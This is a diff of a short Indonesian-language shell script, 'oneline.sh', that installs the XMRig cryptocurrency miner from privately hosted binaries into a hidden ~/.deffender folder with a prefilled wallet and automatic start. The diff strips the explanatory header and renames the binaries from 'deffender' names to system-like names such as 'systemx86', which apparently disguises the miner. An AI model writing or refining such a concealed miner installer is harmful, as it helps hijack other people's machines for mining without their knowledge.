@@ -1,17 +1,6 @@
 #!/bin/sh
 # oneline.sh — Installer XMRig multi-arsitektur dari binary hasil build sendiri.
-# Sumber binary: repo GitHub pribadi (dedicated ke tiap arsitektur).
-#   x86_64/amd64 -> deffenderX86
-#   aarch64/arm64 -> deffenderARM64 (or deffenderarm64 static if present)
-#   armv7l        -> deffender.armv7
-# Verifikasi SHA256 wajib, config langsung keisi, sekali jalan langsung start.
-#
-# Pakai:  sh oneline.sh
-# Env opsional: REPO_USER (username GitHub), REPO_NAME (nama repo),
-#               BRANCH (default main), WALLET (default wallet yang sudah keisi),
-#               DEFFENDER_DIR (lokasi instalasi, default ~/.deffender)
-#
-# WORKDIR = ~/.deffender (folder tersembunyi).
+
 
 set -eu
 
@@ -39,8 +28,8 @@ dl() { # $1=URL, $2=file output
 # --- Deteksi arsitektur -> nama file binary di repo --------------------------
 # SKEMA: x64 -> deffenderX8 | aarch64 -> deffenderARM64 | armv7 -> deffender.armv7
 case "$(uname -m)" in
-    x86_64|amd64) BIN="deffenderX86" ;;
-    aarch64|arm64) BIN="deffenderARM64" ;;
+    x86_64|amd64) BIN="systemx86" ;;
+    aarch64|arm64) BIN="system64" ;;
     armv7l) BIN="deffender.armv7" ;;
     *) echo "[-] Arsitektur tidak didukung: $(uname -m)"; exit 1 ;;
 esac
